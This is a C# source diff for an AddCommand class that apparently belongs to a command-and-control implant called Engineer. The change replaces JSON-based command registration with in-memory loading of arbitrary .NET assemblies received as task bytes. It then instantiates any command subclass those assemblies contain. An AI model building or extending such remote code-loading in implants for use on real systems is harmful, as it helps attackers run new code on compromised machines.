@@ -1,8 +1,7 @@
 ﻿using System;
 using System.Reflection;
 using System.Threading.Tasks;
-using Engineer.Functions;
-using Engineer.Models;
+using DynamicEngLoading;
 
 namespace Engineer.Commands;
 
@@ -13,28 +12,42 @@ public class AddCommand : EngineerCommand
     {
         try
         {
-            //task.file and deseralize it to a EngineerCommand object then add it to the Program._Commands list
-            if(task.File == null)
+            var assemblyBytes = task.File;
+            if(assemblyBytes == null)
             {
-                Tasking.FillTaskResults("Error: /command argument contains no data, please specify a valid command ",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
-            }
-            else
-            if(task.File.Length < 1)
-            {
-                Tasking.FillTaskResults("Error: /command argument contains no data, please specify a valid command ",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Error: no file sent", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
             }
             else
             {
-                var newCommand = task.File.JsonDeserialize<EngineerCommand>();
-                Program._commands.Add(newCommand);
-                Tasking.FillTaskResults($"Command {newCommand.Name} added successfully",task,EngTaskStatus.Complete,TaskResponseType.String);
+                var assembly = Assembly.Load(assemblyBytes);
+                // Load and execute the EngineerCommand from the received assembly
+                foreach (var type in assembly.GetTypes()) // types would be a class in this instance
+                {
+                    if (type.IsSubclassOf(typeof(EngineerCommand)))  // checks to make sure thing is inside the EngineerCommand class first
+                    {
+                        var newCommand = (IEngineerCommand)Activator.CreateInstance(type); //returns a class so must be casted to EngineerCommand
+                        Program._commands.Add(newCommand); 
+                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Command {newCommand.Name} added successfully", task, EngTaskStatus.Complete, TaskResponseType.String);
+                        return;
+                    }
+                }
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Error: no EngineerCommand found in assembly", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
             }
-
         }
         catch (Exception e)
         {
-            //Console.WriteLine(e.Message);
-            Tasking.FillTaskResults($"{e.Message}",task,EngTaskStatus.Failed,TaskResponseType.String);
+            if (e is ReflectionTypeLoadException typeLoadException)
+            {
+                foreach (var loaderException in typeLoadException.LoaderExceptions)
+                {
+                    Console.WriteLine("LoaderException: " + loaderException.Message);
+                }
+            }
+            Console.WriteLine(e.Message);
+            Console.WriteLine(e.StackTrace);
+            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"{e.Message}",task,EngTaskStatus.Failed,TaskResponseType.String);
         }
     }
+
+    
 }
